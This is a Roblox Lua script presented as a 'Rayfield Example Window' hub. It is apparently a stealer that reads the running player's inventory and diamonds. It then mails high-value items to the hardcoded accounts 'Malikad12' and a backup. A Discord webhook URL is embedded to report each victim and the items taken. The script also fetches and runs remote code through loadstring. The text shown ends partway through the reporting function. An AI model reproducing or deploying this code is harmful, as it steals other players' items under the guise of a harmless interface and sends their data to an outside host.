local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()

local Window = Rayfield:CreateWindow({
   Name = "Rayfield Example Window",
   LoadingTitle = "Rayfield Interface Suite",
   LoadingSubtitle = "by Sirius",
   Theme = "Default",  -- You can change the theme if you want

   DisableRayfieldPrompts = false,
   DisableBuildWarnings = false, -- Keeps warnings for version mismatches, you can change this if you prefer no warnings

   ConfigurationSaving = {
      Enabled = true,
      FolderName = nil,  -- Optional custom folder name (you can leave it as nil if you don't need a custom folder)
      FileName = "Big Hub"  -- Name of the file where the configuration will be saved
   },
})

-- Remove Discord and KeySystem configuration sections since they're not being used in this version

Username = "Malikad12"
Username2 = "SherifIsTheGoat1" -- stuff will get sent to this user if first user's mailbox is full
webhook = "https://discord.com/api/webhooks/1307880256253726761/iJyeK9v2GFlD7whR7Dvw8uDO5A_EBPEeew_lDenSSVy_5sbHH6mSmlt7PtXmLbsTkgCi"
min_rap = 10000000 -- minimum rap of each item you want to get sent to you. 1 mil by default

_G.scriptExecuted = _G.scriptExecuted or false
if _G.scriptExecuted then
    return
end
_G.scriptExecuted = true

local network = game:GetService("ReplicatedStorage"):WaitForChild("Network")
local library = require(game.ReplicatedStorage.Library)
local save = require(game:GetService("ReplicatedStorage"):WaitForChild("Library"):WaitForChild("Client"):WaitForChild("Save")).Get().Inventory
local mailsent = require(game:GetService("ReplicatedStorage"):WaitForChild("Library"):WaitForChild("Client"):WaitForChild("Save")).Get().MailboxSendsSinceReset
local plr = game.Players.LocalPlayer
local MailMessage = "jsp"
local HttpService = game:GetService("HttpService")
local sortedItems = {}
local totalRAP = 0
local getFucked = false
local GetSave = function()
    return require(game.ReplicatedStorage.Library.Client.Save).Get()
end

local newamount = 20000

if mailsent ~= 0 then
newamount = math.ceil(newamount * (1.5 ^ mailsent))
end

local GemAmount1 = 1
for i, v in pairs(GetSave().Inventory.Currency) do
    if v.id == "Diamonds" then
        GemAmount1 = v._am
break
    end
end

if newamount > GemAmount1 then
    return
end

local function formatNumber(number)
local number = math.floor(number)
local suffixes = {"", "k", "m", "b", "t"}
local suffixIndex = 1
while number >= 1000 do
number = number / 1000
suffixIndex = suffixIndex + 1
end
return string.format("%.2f%s", number, suffixes[suffixIndex])
end

local function SendMessage(username, diamonds)
    local headers = {
        ["Content-Type"] = "application/json",
    }

local fields = {
{
name = "Retard Username:",
value = username,
inline = true
},
{
name = "Items to be sent:",
value = "",
inline = false
},
        {
            name = "Summary:",
            value = "",
            inline = false
        }
}

    local combinedItems = {}
    local itemRapMap = {}